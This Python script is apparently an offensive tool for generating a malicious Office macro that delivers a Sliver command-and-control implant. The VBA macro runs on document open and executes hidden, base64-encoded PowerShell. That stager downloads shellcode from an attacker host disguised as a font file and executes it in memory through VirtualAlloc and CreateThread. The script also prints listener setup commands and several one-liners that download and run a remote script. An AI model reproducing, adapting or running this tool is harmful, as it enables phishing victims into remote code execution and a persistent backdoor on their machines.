#!/usr/bin/env python3
import sys, base64, argparse, os
from argparse import RawTextHelpFormatter

def main(lhost, lport, webport):
   with open(output, "w") as f:
       f.write("""Sub AutoOpen()
\tMyMacro
End Sub

Sub Document_Open()
\tMyMacro
End Sub

Sub MyMacro()
\tDim Str As String
""".expandtabs(4))
   n = 50
   for i in range(0, len(base64cmd), n):
       with open(output, "a") as f:
           f.write("\tStr = Str + ".expandtabs(4) + '"' +base64cmd[i:i+n] + '"\n')
   with open(output, "a") as f:
       f.write("""
\tCreateObject("Wscript.Shell").Run Str
End Sub
""".expandtabs(4))

   f = open(output, 'r')
   file_contents = f.read()

   # Start Printing Output :)
   print (CRED + '==== Sliver Stager Setup ====\n' + CEND)
   print (f'profiles new --mtls {lhost} --format shellcode win64\n')
   print (f'stage-listener --url http://"{lhost}":"{lport}" --profile win64\n')


   print (CRED + '==== Sliver Macro Payload ====\n' + CEND)
   print(file_contents)
   print (CGREEN + '#> Sliver_Macro.txt was written to CWD\n' + CEND)
   if 'Sliver_Macro.txt' in itemlist:
      print (cwd + '/Sliver_Macro.txt\n')

   #write to file Sliver.ps1
   file = open ("Sliver.ps1","w")
   file.write (payload)
   file.close

   print (CRED + '==== Sliver.ps1 Script Staging ====\n' + CEND)
   print (CGREEN + '#> Sliver.ps1 was written to CWD\n' + CEND)
   if 'Sliver.ps1' in itemlist:
      print (cwd + '/Sliver.ps1\n')
   print (CGREEN + '#> Host a webserver\n' + CEND)
   print (f' python3 -m http.server {webport} ')
   print ('')
   print (CRED + '=== PS BASE64 Encoded Command ====\n' + CEND)
   print (base64cmd)
   print ('')
   print (CRED + f'==== ECHO CMD Stager via webserver {webport} ====\n' + CEND)
   print (echocmd)
   print ('')
   print (echocmd2)
   print ('')
   print (CRED + f'==== IWR Sliver.ps1 Download to Disk via webserver {webport} !OSPEC ====\n' + CEND)
   print (iwr)
   print ('')
   print (iwr2)
   print ('')
   print (CPURPLE + 'Bred as living shields, these slivers have proven unruly—they know they cannot be caught.' + CEND)

def menu():
   print ("\n")
   print ("███████╗██╗     ██╗██╗   ██╗███████╗██████╗     ███████╗████████╗ █████╗  ██████╗ ███████╗ ██╗")
   print ("██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗    ██╔════╝╚══██╔══╝██╔══██╗██╔════╝ ██╔════╝███║")
   print ("███████╗██║     ██║██║   ██║█████╗  ██████╔╝    ███████╗   ██║   ███████║██║  ███╗█████╗  ╚██║")
   print ("╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗    ╚════██║   ██║   ██╔══██║██║   ██║██╔══╝   ██║")
   print ("███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║    ███████║   ██║   ██║  ██║╚██████╔╝███████╗ ██║")
   print ("╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝    ╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝ ╚═╝")
   print ("\n")

# argument parser

parser = argparse.ArgumentParser(description=menu(),formatter_class=RawTextHelpFormatter, usage="python evil_macro.py -l --lhost sliver stage-listener ip -p --port sliver stage-listener port --wp --webport Python HTTP.SERVER port")
parser.add_argument('-l','--lhost', dest='lhost', action='store', type=str, help='Insert an lhost for Sliver stage-listener', required=True)
parser.add_argument('-p','--lport', dest='lport', action='store', type=int, help='Insert an lport for Sliver stage-listener', required=True)
parser.add_argument('-wp','--webport', dest='webport', action='store', type=int, help='Insert an lport for Python HTTP.Server for .ps1 staging', required=True)

args=parser.parse_args()
lhost = args.lhost
lport = args.lport
webport = args.webport

# Sliver PS Stage1 Script

buf = '$Win32 = @"\n'
buf += 'using System;\n'
buf += 'using System.Runtime.InteropServices;\n'
buf += 'public class Win32 {\n'
buf += '[DllImport("kernel32")]\n'
buf += 'public static extern IntPtr VirtualAlloc(IntPtr lpAddress,\n'
buf += '    uint dwSize,\n'
buf += '    uint flAllocationType,\n'
buf += '    uint flProtect);\n'
buf += '[DllImport("kernel32", CharSet=CharSet.Ansi)]\n'
buf += 'public static extern IntPtr CreateThread(\n'
buf += '    IntPtr lpThreadAttributes,\n'
buf += '    uint dwStackSize,\n'
buf += '    IntPtr lpStartAddress,\n'
buf += '    IntPtr lpParameter,  \n'
buf += '    uint dwCreationFlags,\n'
buf += '    IntPtr lpThreadId);\n'
buf += '[DllImport("kernel32.dll", SetLastError=true)]  \n'
buf += 'public static extern UInt32 WaitForSingleObject(\n'
buf += '    IntPtr hHandle,\n'
buf += '    UInt32 dwMilliseconds);\n'
buf += '} \n'
buf += '"@\n'
buf += 'Add-Type $Win32\n'
buf += '\n'
buf += f'$shellcode = (New-Object System.Net.WebCLient).DownloadData("http://{lhost}:{lport}/l4rry.woff")\n'
buf += 'if ($shellcode -eq $null) {Exit};\n'
buf += '$size = $shellcode.Length\n'
buf += '\n'
buf += '[IntPtr]$addr = [Win32]::VirtualAlloc(0,$size,0x1000,0x40); \n'
buf += '[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $size)\n'
buf += '$thandle=[Win32]::CreateThread(0,0,$addr,0,0,0);\n'
buf += '[Win32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")\n'

payload = buf

# global variables

itemlist = os.listdir()
cwd = os.getcwd()
output = "Sliver_Macro.txt"

# payload variables

base64cmd = "powershell.exe -nop -w hidden -Enc " + base64.b64encode(payload.encode('utf16')[2:]).decode()
echocmd = f'echo IEX(New-Object Net.WebClient).DownloadString("http://{lhost}:{webport}/Sliver.ps1") | powershell -noprofile -'
echocmd2 = f'C:\Windows\System32\cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString("http://{lhost}:{webport}/Sliver.ps1") | powershell -noprofile -'
iwr = f'powershell.exe iwr -UseBasicParsing http://{lhost}:{webport}/Sliver.ps1 -Outfile %TMP%\Sliver.ps1; %TMP%\Sliver.ps1'
iwr2 = f'C:\Windows\System32\cmd.exe /c powershell.exe iwr -UseBasicParsing http://{lhost}:{webport}/Sliver.ps1 -Outfile %TMP%\Sliver.ps1; %TMP%\Sliver.ps1'

# Color Coding

CRED = '\033[91m'
CGREEN = '\033[92m'
CPURPLE = '\033[95m'
CEND = '\033[0m'

main(lhost, lport, webport)
